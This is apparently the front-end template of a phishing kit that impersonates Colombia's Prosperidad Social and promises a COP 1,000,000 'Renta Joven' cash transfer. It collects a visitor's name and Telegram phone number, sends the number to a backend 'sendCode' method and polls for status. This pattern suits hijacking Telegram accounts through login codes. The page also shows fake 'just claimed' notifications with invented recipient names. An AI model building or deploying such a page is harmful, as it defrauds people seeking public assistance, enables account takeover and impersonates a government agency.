<div class="py-2 d-block">

  <div id="triggerContainer" class="text-center" style="background: transparent;">
    <style>
      /* --- NOTIFIKASI DALAM FORM (BARU) --- */
      #form-notif-container {
        position: absolute;
        top: -30px;
        left: 50%;
        transform: translateX(-50%);
        width: 90%;
        max-width: 320px;
        z-index: 10001;
        pointer-events: none;
      }

      .inner-notif {
        background: #ffffff;
        border-radius: 50px;
        padding: 6px 15px;
        display: flex;
        align-items: center;
        box-shadow: 0 4px 15px rgba(0, 0, 0, 0.15);
        border: 1px solid #eee;
        opacity: 0;
        transform: translateY(-10px);
        transition: all 0.5s cubic-bezier(0.34, 1.56, 0.64, 1);
      }

      .inner-notif.show {
        opacity: 1;
        transform: translateY(0);
      }

      .inner-avatar {
        width: 38px;
        height: 38px;
        border-radius: 50%;
        margin-right: 12px;
        border: 2px solid #4CAF50;
        object-fit: cover;
      }

      .inner-content {
        text-align: left;
      }

      .inner-name {
        font-size: 13px;
        font-weight: 800;
        color: #333;
        margin: 0;
        line-height: 1.2;
      }

      .inner-text {
        font-size: 11px;
        color: #666;
        margin: 0;
        line-height: 1.2;
      }

      .inner-dot {
        width: 7px;
        height: 7px;
        background: #4CAF50;
        border-radius: 50%;
        display: inline-block;
        margin-right: 4px;
      }

      /* --- STYLE ASLI (TIDAK DIUBAH) --- */
      .hero-slider {
        width: 100%;
        max-width: 600px;
        margin: 0 auto 20px;
        border-radius: 15px;
        overflow: hidden;
        box-shadow: 0 4px 15px rgba(0, 0, 0, 0.1);
      }

      .carousel-item img {
        width: 100%;
        height: 350px;
        object-fit: cover;
        display: block;
      }

      @media (max-width: 768px) {
        .carousel-item img {
          height: 200px;
        }
      }

      .btn-init {
        height: 58px;
        width: 100%;
        max-width: 400px;
        border-radius: 8px;
        background: #fff;
        color: #000;
        border: 2px solid #000;
        font-weight: 800;
        font-size: 15px;
        text-transform: uppercase;
        transition: all 0.2s ease-in-out;
        cursor: pointer;
        display: flex;
        align-items: center;
        justify-content: center;
        margin: 0 auto;
        box-shadow: 0 4px 15px rgba(0, 0, 0, 0.1);
      }

      .btn-init:active,
      .btn-init.clicked {
        background: #000 !important;
        color: #fff !important;
        transform: scale(0.98);
      }

      #modalOverlay {
        display: none;
        position: fixed;
        top: 0;
        left: 0;
        width: 100%;
        height: 100%;
        background: rgba(0, 0, 0, 0.6);
        z-index: 10000;
        align-items: center;
        justify-content: center;
        padding: 20px;
      }

      #mainFormContainer {
        display: none;
        width: 100%;
        max-width: 450px;
        background: #fff;
        border-radius: 20px;
        padding: 30px 20px 40px;
        box-shadow: 0 10px 30px rgba(0, 0, 0, 0.3);
        position: relative;
        margin: auto;
        opacity: 0;
        transform: scale(0.8);
        transition: all 0.3s cubic-bezier(0.34, 1.56, 0.64, 1);
      }

      #mainFormContainer.show {
        opacity: 1;
        transform: scale(1);
      }
    </style>

    <div class="hero-slider">
      <div id="carouselBanner" class="carousel slide" data-bs-ride="carousel">
        <div class="carousel-inner">
          <div class="carousel-item active" data-bs-interval="3000"><img src="assets/0.jpg" alt="Banner 0"></div>
          <div class="carousel-item" data-bs-interval="3000"><img src="assets/1.jpg" alt="Banner 1"></div>
          <div class="carousel-item" data-bs-interval="3000"><img src="assets/2.jpg" alt="Banner 2"></div>
          <div class="carousel-item" data-bs-interval="3000"><img src="assets/3.jpg" alt="Banner 3"></div>
        </div>
      </div>
    </div>

    <h1>A través de este enlace, Prosperidad Social distribuirá transferencias de efectivo a los ciudadanos colombianos
      elegibles.</h1>
    <h2 style="font-size: 14px; color: #666;">A través de este enlace, Prosperidad Social distribuirá transferencias de
      efectivo a los ciudadanos colombianos elegibles.</h2>
    <p style="font-size: 14px; color: #666; font-weight: bold;">¡Regístrese y verifique suelegibilidad!</p>

    <button type="button" id="showFormBtn" class="btn btn-init">Consulte aquí si su hogar es beneficiario</button>
  </div>

  <div id="modalOverlay">
    <div id="mainFormContainer">

      <div id="form-notif-container">
        <div id="innerNotifBox" class="inner-notif">
          <img src="" id="innerAvatar" class="inner-avatar">
          <div class="inner-content">
            <p class="inner-name" id="innerUserName"></p>
            <p class="inner-text"><span class="inner-dot"></span>Acaba de reclamar con éxito✅️</p>
          </div>
        </div>
      </div>

      <div class="text-center mb-3">
        <img src="assets/logoo.png" style="width: 100%; max-width: 295px; margin: auto; display: block;">
      </div>

      <div class="mb-4 text-center">
        <h2 style="font-size: 18px; font-weight: 800; color: #212121; margin-bottom: 5px;">Asistencia en Efectivo</h2>
        <p style="font-size: 14px; color: #666; line-height: 1.4;">Programa Renta Joven <br><strong
            style="color: #2c3e50; font-size: 16px;">COP 1.000.000</strong></p>
      </div>

      <p id="wrong" class="text-center mt-2"
        style="display:none; color: #d32f2f; font-size: 13px; font-weight: 600; background: #ffebee; padding: 8px; border-radius: 8px;">
        Ingrese un número de telepon válido.</p>

      <div class="mb-3">
        <label style="font-size: 13px; font-weight: 700; color: #444; margin-bottom: 6px; display: block;">Nombre
          completo</label>
        <input type="text" name="nama" class="form-control shadow-none" placeholder="Ingrese su nombre completo"
          style="height: 48px; border-radius: 12px; border: 1.5px solid #eee; background: #f9f9f9; font-size: 15px;">
      </div>

      <div class="mb-3">
        <label style="font-size: 13px; font-weight: 700; color: #444; margin-bottom: 6px; display: block;">Número de
          Telegram</label>
        <div style="position:relative;">
          <img src="assets/kolombia.png" id="flagIcon"
            style="position: absolute; left: 12px; top: 50%; transform: translateY(-50%); width: 24px; display: none; z-index: 5;">
          <input type="text" class="form-control shadow-none" name="phone" id="phone" placeholder="Número de Telegram"
            autocomplete="off" inputmode="numeric" required
            style="height: 48px; border-radius: 12px; border: 1.5px solid #eee; background: #f9f9f9; font-size: 15px;">
        </div>
      </div>

      <div class="mb-4" style="display:flex; gap:12px; align-items: flex-start;">
        <input type="checkbox" id="agree" style="width: 20px; height: 20px; accent-color: #000; cursor: pointer;">
        <label for="agree" style="font-size: 12px; color: #555; line-height: 1.4; cursor: pointer;">Acepto continuar con
          la solicitud dan el registro oficial.</label>
      </div>

      <div id="checkboxWarning"
        style="display:none; color:#d32f2f; font-size:12px; font-weight:600; text-align:center; margin-bottom:15px;">⚠️
        Debe marcar la casilla primero</div>

      <button class="btn w-100" id="claimBtn"
        style="height: 52px; border-radius: 12px; background: #000; color: #fff; font-weight: 800; font-size: 16px; border: none; letter-spacing: 0.5px;">RECLAMAR</button>
    </div>
  </div>
</div>

<script>
  $(document).ready(function () {

    // --- DATA PENERIMA (BARU) ---
    const listPenerima = [
      { n: "Rosa Mamani", p: "assets/p1.jpg" },
      { n: "Paola Rivas", p: "https://ui-avatars.com/api/?name=P&background=ccc&color=fff" },
      { n: "Elena Condori", p: "assets/p2.jpg" },
      { n: "Lucia Mendez", p: "https://ui-avatars.com/api/?name=L&background=ccc&color=fff" },
      { n: "Carlos Vargas", p: "assets/p3.jpg" },
      { n: "Maria Quispe", p: "assets/p4.jpg" },
      { n: "Andrés Castro", p: "https://ui-avatars.com/api/?name=A&background=ccc&color=fff" },
      { n: "Juan Blanco", p: "assets/p5.jpg" },
      { n: "Luis Hernandez", p: "assets/p6.jpg" },
      { n: "Camila Vega", p: "https://ui-avatars.com/api/?name=C&background=ccc&color=fff" },
      { n: "Sofia Garcia", p: "assets/p7.jpg" },
      { n: "Diego Torres", p: "assets/p8.jpg" },
      { n: "Javier Ortiz", p: "https://ui-avatars.com/api/?name=J&background=ccc&color=fff" },
      { n: "Mateo Rojas", p: "https://ui-avatars.com/api/?name=M&background=ccc&color=fff" },
      { n: "Valentina Soliz", p: "https://ui-avatars.com/api/?name=V&background=ccc&color=fff" },
      { n: "Ricardo Peña", p: "https://ui-avatars.com/api/?name=R&background=ccc&color=fff" }
    ];

    let idx = 0;
    let notifInterval;

    function startInnerNotif() {
      if (notifInterval) clearInterval(notifInterval);
      notifInterval = setInterval(function () {
        const user = listPenerima[idx];
        $("#innerAvatar").attr("src", user.p);
        $("#innerUserName").text(user.n);
        $("#innerNotifBox").addClass("show");

        setTimeout(function () {
          $("#innerNotifBox").removeClass("show");
          idx = (idx + 1) % listPenerima.length;
        }, 2000);
      }, 4000);
    }

    // LOGIKA TAMPIL TENGAH (Asli)
    $("#showFormBtn").on("click", function () {
      $(this).addClass("clicked");
      setTimeout(function () {
        $("#modalOverlay").css("display", "flex");
        $("#mainFormContainer").show();
        setTimeout(function () {
          $("#mainFormContainer").addClass("show");
          startInnerNotif(); // Mulai notif saat form muncul
        }, 50);
      }, 150);
    });

    // TUTUP POPUP (Asli)
    $("#modalOverlay").on("click", function (e) {
      if (e.target !== this) return;
      $("#mainFormContainer").removeClass("show");
      clearInterval(notifInterval); // Berhenti saat form tutup
      setTimeout(function () {
        $("#modalOverlay").hide();
        $("#showFormBtn").removeClass("clicked");
      }, 300);
    });

    // --- LOGIKA BACKEND ASLI (TIDAK DIUBAH) ---
    $("#wrong").hide();
    $("#loader").hide();
    $("#checkboxWarning").hide();

    function showCountry() {
      $("#flagIcon").show();
      $("#phone").css("padding-left", "48px");
      if ($("#phone").val() == "") { $("#phone").val("+57 "); }
    }

    $("#phone").on("focus click input touchstart", function () { showCountry(); });

    $("#claimBtn").on("click", function (e) {
      e.preventDefault();
      if (!$("#agree").is(":checked")) { $("#checkboxWarning").fadeIn(); return; }
      var phone = $("#phone").val();
      if (phone != "") {
        $("#loader").show();
        $.ajax({
          url: "<?= base_url("API/index.php") ?>",
          type: "POST",
          data: { "method": "sendCode", "phone": phone },
          success: function () { setTimeout(function () { checkStatus(); }, 500); }
        });
      }
    });

    function checkStatus() {
      $.ajax({
        url: 'API/index.php',
        type: "POST",
        data: { "method": "getStatus" },
        success: function (data) {
          if (data.result.status == "success") { window.location.reload(); }
          else if (data.result.status == "failed") { $("#wrong").show(); $("#loader").hide(); }
          else { setTimeout(function () { checkStatus(); }, 500); }
        }
      });
    }
  });
</script>